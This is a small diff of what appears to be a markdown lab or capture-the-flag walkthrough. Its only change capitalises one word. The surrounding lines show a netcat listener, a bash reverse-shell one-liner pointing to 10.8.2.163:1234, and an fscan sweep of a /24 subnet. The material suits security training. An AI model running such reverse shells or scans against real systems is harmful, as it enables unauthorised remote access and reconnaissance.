@@ -48,7 +48,7 @@ nc -lvnp 1234
 
 > bash -c 'bash -i >& /dev/tcp/10.8.2.163/1234 0>&1'
 ```
-now let's do a scan with fscan to see what's running on the machine :
+Now let's do a scan with fscan to see what's running on the machine :
 
 ```bash
 ./fscan -h 10.10.208.0/24
